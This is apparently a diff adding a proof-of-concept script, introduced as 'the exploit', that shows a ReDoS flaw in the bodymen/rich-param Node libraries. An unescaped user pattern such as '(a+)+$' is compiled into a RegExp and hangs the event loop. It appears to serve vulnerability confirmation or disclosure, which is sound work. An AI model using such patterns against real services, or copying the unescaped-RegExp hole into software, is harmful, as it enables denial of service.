@@ -1,0 +1,35 @@
+Confirmed the ReDoS reliably hangs Node. Here's the exploit:
+
+```javascript
+// ReDoS via bodymen/rich-param: attacker-controlled string is passed directly
+// into `new RegExp(userInput, 'i')` inside rich-param's Param#value(), with no
+// escaping or complexity checks (rich-param/dist/index.js, Param.prototype.value:
+// `if (options.type.name === 'RegExp') { _value = new RegExp(_value, 'i'); }`).
+//
+// In a real deployment this "type: RegExp" schema field is exactly how bodymen
+// apps expose user-searchable fields (e.g. a `search` body param used to build
+// a MongoDB regex filter). Any client that controls the raw string reaching
+// that field can supply a catastrophic-backtracking pattern.
+
+const { Param } = require("./node_modules/bodymen");
+
+// Schema field declared with type RegExp (a normal bodymen/querymen pattern
+// for "search" style fields).
+const param = new Param("search", undefined, { type: RegExp });
+
+// Attacker-controlled pattern, taken verbatim from e.g. req.body.search.
+const attackerPattern = "(a+)+$";
+
+// This compiles the attacker's pattern straight into a live RegExp object,
+// with no sanitization of regex metacharacters.
+const compiled = param.value(attackerPattern);
+console.log("Compiled attacker-controlled regex:", compiled);
+
+// Attacker-controlled (or merely long/adversarial) input then gets matched
+// against it downstream (e.g. filtering results) -- this call never returns
+// in practice, demonstrating the ReDoS.
+console.log("Triggering catastrophic backtracking...");
+const evilInput = "a".repeat(35) + "!";
+compiled.test(evilInput); // hangs the event loop indefinitely
+console.log("unreachable");
+```
